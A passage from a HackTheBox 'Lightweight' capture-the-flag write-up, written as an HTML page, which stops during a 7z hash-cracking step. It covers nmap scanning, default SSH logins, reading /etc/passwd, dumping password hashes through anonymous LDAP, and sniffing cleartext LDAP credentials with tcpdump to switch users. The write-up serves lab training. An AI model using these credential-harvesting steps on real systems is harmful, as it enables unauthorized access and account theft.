@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Lightweight</strong></h1>
+        <em>Released: March 2017 / Pwned: May 11th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        This is a very different box to others that I've tried. It took a little a bit of creativity to get a user, and then research on a new a topic to get root.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.119</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>intial.txt&nbsp;10.10.10.119<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-05-10&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>24&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.119<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.052s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;997&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.4&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db&nbsp;(ED25519)<br>
+                80/tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.6&nbsp;((CentOS)&nbsp;OpenSSL/1.0.2k-fips&nbsp;mod_fcgid/2.3.9&nbsp;PHP/5.4.16)<br>
+                |_http-server-header:&nbsp;Apache/2.4.6&nbsp;(CentOS)&nbsp;OpenSSL/1.0.2k-fips&nbsp;mod_fcgid/2.3.9&nbsp;PHP/5.4.16<br>
+                |_http-title:&nbsp;Lightweight&nbsp;slider&nbsp;evaluation&nbsp;page&nbsp;-&nbsp;slendr<br>
+                389/tcp&nbsp;open&nbsp;&nbsp;ldap&nbsp;&nbsp;&nbsp;&nbsp;OpenLDAP&nbsp;2.2.X&nbsp;-&nbsp;2.3.X<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=lightweight.htb<br>
+                |&nbsp;Subject&nbsp;Alternative&nbsp;Name:&nbsp;DNS:lightweight.htb,&nbsp;DNS:localhost,&nbsp;DNS:localhost.localdomain<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2018-06-09T13:32:51<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2019-06-09T13:32:51<br>
+                |_ssl-date:&nbsp;TLS&nbsp;randomness&nbsp;does&nbsp;not&nbsp;represent&nbsp;time<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;Linux&nbsp;3.10&nbsp;-&nbsp;4.11&nbsp;(92%),&nbsp;Linux&nbsp;3.2&nbsp;-&nbsp;4.9&nbsp;(92%),&nbsp;Linux&nbsp;3.18&nbsp;(90%),&nbsp;Crestron&nbsp;XPanel&nbsp;control&nbsp;system&nbsp;(90%),&nbsp;Linux&nbsp;3.16&nbsp;(89%),&nbsp;ASUS&nbsp;RT-N56U&nbsp;WAP&nbsp;(Linux&nbsp;3.4)&nbsp;(87%),&nbsp;Linux&nbsp;3.1&nbsp;(87%),&nbsp;Linux&nbsp;3.2&nbsp;(87%),&nbsp;HP&nbsp;P2000&nbsp;G3&nbsp;NAS&nbsp;device&nbsp;(87%),&nbsp;AXIS&nbsp;210A&nbsp;or&nbsp;211&nbsp;Network&nbsp;Camera&nbsp;(Linux&nbsp;2.6.17)&nbsp;(87%)<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(test&nbsp;conditions&nbsp;non-ideal).<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;23.44&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        <strong>22/ssh</strong> is good to take a mental note of.<br>
+        <strong>80/tcp</strong> you should check first.<br>
+        <strong>389/ldap</strong> might be a place to glean some information.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/tcp to 22/ssh</strong></h2><br>
+        Have a read of the website.<br>
+        <br>
+        <code>http://10.10.10.119/user.php</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        You can ssh into the box using your ip as your username and password.<br>
+        In my case I logged in like this (the web page recommends you to change your password, so I did):<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;10.10.13.128@10.10.10.119<br>
+                The&nbsp;authenticity&nbsp;of&nbsp;host&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.10.119&nbsp;(10.10.10.119)'</span>&nbsp;can<span style="color:#3ad900;font-weight:400">'t&nbsp;be&nbsp;established.<br>
+                ECDSA&nbsp;key&nbsp;fingerprint&nbsp;is&nbsp;SHA256:FWyyew+o9WoPYkfIKGEbTMsexks1z8ZkSUs9O+2AMSU.<br>
+                Are&nbsp;you&nbsp;sure&nbsp;you&nbsp;want&nbsp;to&nbsp;continue&nbsp;connecting&nbsp;(yes/no)?&nbsp;yes<br>
+                Warning:&nbsp;Permanently&nbsp;added&nbsp;'</span>10.10.10.119<span style="color:#3ad900;font-weight:400">'&nbsp;(ECDSA)&nbsp;to&nbsp;the&nbsp;list&nbsp;of&nbsp;known&nbsp;hosts.<br>
+                10.10.13.128@10.10.10.119'</span>s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.10.13.128<br>
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">pwd</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>10.10.13.128<br>
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">passwd</span><br>
+                Changing&nbsp;password&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">user</span>&nbsp;10.10.13.128.<br>
+                Changing&nbsp;password&nbsp;for&nbsp;10.10.13.128.<br>
+                (current)&nbsp;UNIX&nbsp;password:&nbsp;10.10.13.128<br>
+                New&nbsp;password:&nbsp;heytherejohn<br>
+                Retype&nbsp;new&nbsp;password:&nbsp;<br>
+                passwd:&nbsp;all&nbsp;authentication&nbsp;tokens&nbsp;updated&nbsp;successfully.<br>
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        I had a poke around the file system checking for privesc methods. /etc/passwd had a user that stood out to me:<br>
+            <div class="codebox">
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span><br>
+                ...<br>
+                tcpdump<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>72<span style="color:#ff9d00;font-weight:700">:</span>72<span style="color:#ff9d00;font-weight:700">::/:/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>nologin<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Come back to this later.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 389/ldap</strong></h2><br>
+        LDAP - Lightweight Directory Access Protocol - is a “lightweight client-server protocol for accessing directory services.� A common use of LDAP is to provide a central place to store usernames and passwords.<br>
+        <br>
+        LDAP feels like it was designed to be intentionally difficult to use, so refer here for better explanation/commands - <a href="https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities">https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities</a><br>
+        <br>
+        The only thing to try with this LDAP server is anonymous authentication to see if we get any information.<br>
+        Before you can anonymously authenticate you need to get the LDAP server's naming contexts.<br>
+        <br>
+        Nmap should get the naming contexts for you (my nmap scan did).<br>
+        If not, get naming contexts:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;ldapsearch&nbsp;-H&nbsp;ldap<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.119&nbsp;-x&nbsp;-s&nbsp;base&nbsp;-b&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;namingContexts<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;extended&nbsp;LDIF</span><br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;LDAPv3</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;base&nbsp;&lt;&gt;&nbsp;with&nbsp;scope&nbsp;baseObject</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;filter:&nbsp;(objectclass=*)</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;requesting:&nbsp;namingContexts&nbsp;</span><br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                dn<span style="color:#ff9d00;font-weight:700">:</span><br>
+                namingContexts<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;dc=lightweight,dc=htb<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;search&nbsp;result</span><br>
+                search<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2<br>
+                result<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0&nbsp;Success<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;numResponses:&nbsp;2</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;numEntries:&nbsp;1</span>
+            </div>
+        </div><br>
+        <br>
+        And now try anonymously authenticating using the naming contexts you just got:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;ldapsearch&nbsp;-H&nbsp;ldap<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.119&nbsp;-x&nbsp;-LLL&nbsp;-b&nbsp;<span style="color:#3ad900;font-weight:400">"dc=lightweight,dc=htb"</span>&nbsp;<br>
+                dn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;dc=lightweight,dc=htb<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;top<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;dcObject<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;organization<br>
+                o<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;lightweight&nbsp;htb<br>
+                dc<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;lightweight<br>
+                <br>
+                dn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cn=Manager,dc=lightweight,dc=htb<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;organizationalRole<br>
+                cn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Manager<br>
+                description<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Directory&nbsp;Manager<br>
+                <br>
+                dn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ou=People,dc=lightweight,dc=htb<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;organizationalUnit<br>
+                ou<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;People<br>
+                <br>
+                dn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ou=Group,dc=lightweight,dc=htb<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;organizationalUnit<br>
+                ou<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Group<br>
+                <br>
+                dn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;uid=ldapuser1,ou=People,dc=lightweight,dc=htb<br>
+                uid<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser1<br>
+                cn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser1<br>
+                sn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser1<br>
+                mail<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser1@lightweight.htb<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;person<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;organizationalPerson<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;inetOrgPerson<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;posixAccount<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;top<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;shadowAccount<br>
+                userPassword<span style="color:#ff9d00;font-weight:700">::</span>&nbsp;e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R<br>
+                &nbsp;oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv<br>
+                shadowLastChange<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;17691<br>
+                shadowMin<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0<br>
+                shadowMax<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;99999<br>
+                shadowWarning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;7<br>
+                loginShell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span><br>
+                uidNumber<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1000<br>
+                gidNumber<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1000<br>
+                homeDirectory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser1<br>
+                <br>
+                dn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;uid=ldapuser2,ou=People,dc=lightweight,dc=htb<br>
+                uid<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser2<br>
+                cn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser2<br>
+                sn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser2<br>
+                mail<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser2@lightweight.htb<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;person<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;organizationalPerson<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;inetOrgPerson<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;posixAccount<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;top<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;shadowAccount<br>
+                userPassword<span style="color:#ff9d00;font-weight:700">::</span>&nbsp;e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms<br>
+                &nbsp;zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x<br>
+                shadowLastChange<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;17691<br>
+                shadowMin<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0<br>
+                shadowMax<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;99999<br>
+                shadowWarning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;7<br>
+                loginShell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span><br>
+                uidNumber<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1001<br>
+                gidNumber<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1001<br>
+                homeDirectory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser2<br>
+                <br>
+                dn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cn=ldapuser1,ou=Group,dc=lightweight,dc=htb<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;posixGroup<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;top<br>
+                cn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser1<br>
+                userPassword<span style="color:#ff9d00;font-weight:700">::</span>&nbsp;e2NyeXB0fXg=<br>
+                gidNumber<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1000<br>
+                <br>
+                dn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cn=ldapuser2,ou=Group,dc=lightweight,dc=htb<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;posixGroup<br>
+                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;top<br>
+                cn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ldapuser2<br>
+                userPassword<span style="color:#ff9d00;font-weight:700">::</span>&nbsp;e2NyeXB0fXg=<br>
+                gidNumber<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1001
+            </div>
+        </div><br>
+        <br>
+        The userPassword values in here are base64 encoded, so base64 decode them (the long ones, not e2NyeXB0fXg=).<br>
+        Using this site is less effort than <code>base64 -d</code> imo - <a href="https://www.base64decode.org/">https://www.base64decode.org/</a><br>
+        <br>
+        ldapuser1 base64 decoded:<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">{</span>crypt<span style="color:#ff9d00;font-weight:700">}</span><span style="color:#7f0044;font-weight:400">$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj</span>.l4MzV7vTnfkE<span style="color:#ff9d00;font-weight:700">/</span>g<span style="color:#ff9d00;font-weight:700">/</span>Z<span style="color:#ff9d00;font-weight:700">/</span>7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA.<span style="color:#ff9d00;font-weight:700">/</span>44<span style="color:#ff9d00;font-weight:700">/</span>
+            </div>
+        </div><br>
+        <br>
+        <a href="https://www.openldap.org/faq/data/cache/344.html">https://www.openldap.org/faq/data/cache/344.html</a><br>
+        "{CRYPT} passwords are designed to be compatible with your system's passwd file. You can generally (see above statement) take the password field from your (possibly shadowed) password file, prefix it with "{CRYPT}"and save this as the password."<br>
+        i.e. the hash here is of the ldapuser1's system password.<br>
+        <br>
+        This knowledge is useful because it tells you what a piece of data you gather later means.<br>
+        <br>
+        You could fall down a rabbit hole and here and try bruteforcing the hash... but don't. (I did)<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) tcpdump</strong></h2><br>
+        LDAP on port 389 is an unencrypted protocol. Since we have a shell on the target already (ssh) and tcpdump is installed (remember information gathered earlier) we can sniff for LDAP authentication being sent over the network.<br>
+        <br>
+        Be patient:<br>
+            <div class="codebox">
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;tcpdump&nbsp;port&nbsp;389&nbsp;and&nbsp;src&nbsp;10.10.10.119&nbsp;and&nbsp;dst&nbsp;10.10.10.119&nbsp;-v&nbsp;-i&nbsp;any&nbsp;-s0&nbsp;-w&nbsp;tcpdump2.pcap&nbsp;<br>
+                tcpdump<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;listening&nbsp;on&nbsp;any,&nbsp;link-type&nbsp;LINUX_SLL&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Linux&nbsp;cooked<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;capture&nbsp;size&nbsp;262144&nbsp;bytes<br>
+                44&nbsp;packets&nbsp;captured<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;<span style="color:#ff9d00;font-weight:700">scp</span>&nbsp;10.10.13.128@10.10.10.119<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>10.10.13.128<span style="color:#ff9d00;font-weight:700">/</span>tcpdump2.pcap&nbsp;.<br>
+                10.10.13.128@10.10.10.119<span style="color:#3ad900;font-weight:400">'s&nbsp;password:&nbsp;<br>
+                tcpdump2.pcap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;4936&nbsp;&nbsp;&nbsp;&nbsp;74.6KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;</span>
+            </div>
+        </div><br>
+        <br>
+        Have a look what you've captured in wireshark:<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        ldapuser2 is authenticating using 8bc8251332abe1d7f105d3e53ad39ac2.<br>
+        <br>
+        Considering the bit of {crypt} knowledge we gained earlier, 8bc8251332abe1d7f105d3e53ad39ac2 must be the ldapuser2's system password.<br>
+            <div class="codebox">
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;ldapuser2<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;8bc8251332abe1d7f105d3e53ad39ac2<br>
+                [ldapuser2@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                backup.7z&nbsp;&nbsp;OpenLDAP-Admin-Guide.pdf&nbsp;&nbsp;OpenLdap.pdf&nbsp;&nbsp;user.txt<br>
+                [ldapuser2@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+                8a866d3bb7e13a57aaeb110297f48026
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) backup.7z</strong></h2><br>
+        ldapuser2 can't use ssh, but your &lt;ip&gt; user can. Copy backup.7z to /tmp, then to your &lt;ip&gt; home directory, and then scp.<br>
+            <div class="codebox">
+                [ldapuser2@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;backup.7z&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<br>
+                [ldapuser2@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>backup.7z&nbsp;.<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;<span style="color:#ff9d00;font-weight:700">scp</span>&nbsp;10.10.13.128@10.10.10.119<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>10.10.13.128<span style="color:#ff9d00;font-weight:700">/</span>backup.7z&nbsp;.<br>
+                10.10.13.128@10.10.10.119<span style="color:#3ad900;font-weight:400">'s&nbsp;password:&nbsp;<br>
+                backup.7z&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;3411&nbsp;&nbsp;&nbsp;&nbsp;53.4KB/s&nbsp;&nbsp;&nbsp;00:00<br>
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;su&nbsp;ldapuser2<br>
+                Password:&nbsp;<br>
+                [ldapuser2@lightweight&nbsp;10.10.13.128]$&nbsp;rm&nbsp;/tmp/backup.7z</span>
+            </div>
+        </div><br>
+        <br>
+        You'll have to bruteforce it.<br>
+        <br>
+        First extract the hash from the 7z file using 7z2hashcat. I had to install libcompress-raw-lzma-perl to get it to work.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;git&nbsp;clone&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>philsmd<span style="color:#ff9d00;font-weight:700">/</span>7z2hashcat.git<br>
+                Cloning&nbsp;into&nbsp;<span style="color:#3ad900;font-weight:400">'7z2hashcat'</span>...<br>
+                ...<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;7z2hashcat<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight<span style="color:#ff9d00;font-weight:700">/</span>7z2hashcat#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                7z2hashcat.pl&nbsp;&nbsp;README.md<br>
